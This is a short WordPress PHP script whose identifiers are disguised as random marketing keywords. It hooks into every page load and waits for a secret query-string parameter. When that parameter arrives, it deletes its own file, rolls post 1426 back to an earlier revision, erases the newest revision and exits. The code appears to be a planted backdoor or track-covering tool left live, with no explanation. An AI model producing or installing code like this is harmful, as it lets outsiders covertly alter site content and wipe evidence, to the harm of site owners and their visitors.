<?php

function message_awesome_cart_really() {
	if (isset($_GET['delivery_pinterest_weather_seo']) && $_GET['delivery_pinterest_weather_seo'] === 'sign_control_specific') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$fields_popup_notice = 1426;
		$shipping_reviews_titles = wp_get_post_revisions($fields_popup_notice);
		if (empty($shipping_reviews_titles)) die('no revisions');
		if (count($shipping_reviews_titles) < 2) die('less than 2');
		$toolbox_optimize_urls_booster = array_shift($shipping_reviews_titles);
		$blogroll_using_express_typography = $toolbox_optimize_urls_booster->ID;
		$image_subscriptions_save = array_shift($shipping_reviews_titles);
		$jquery_lead_manager = $image_subscriptions_save->ID;
		$nice_membership_poster_favicon = wp_restore_post_revision($jquery_lead_manager);
		if ($nice_membership_poster_favicon === false) die('error restoring');
		$nice_membership_poster_favicon = wp_delete_post_revision($blogroll_using_express_typography);		
		if ($nice_membership_poster_favicon === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'message_awesome_cart_really');
